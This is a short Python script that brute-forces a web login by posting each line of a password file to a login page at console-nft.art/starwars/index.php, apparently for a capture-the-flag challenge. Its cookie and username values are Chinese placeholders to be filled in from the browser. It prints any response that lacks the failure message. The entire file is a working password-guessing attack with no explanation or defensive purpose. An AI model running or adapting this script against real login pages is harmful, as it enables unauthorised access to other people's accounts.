import requests

f = open('passwords.txt', 'r')

cookies={}
cookies['_fbp'] = '浏览器看'
cookies['PHPSESSID'] = '浏览器看'

print (cookies)

for line in f:
     data = {}
     data['name'] = 'user_dis的四位数字'
     data['password'] = line.replace("\n", "")
     r = requests.post('https://console-nft.art/starwars/index.php',cookies=cookies, data=data)
     text  = r.text
     if "I feel so weak"  not in text:
         print (text)
         print ("aaaaaaaaaaaaaaaaaa")
         print (line)
         print ("bssssssssssssssssssssnggo")
f.close()
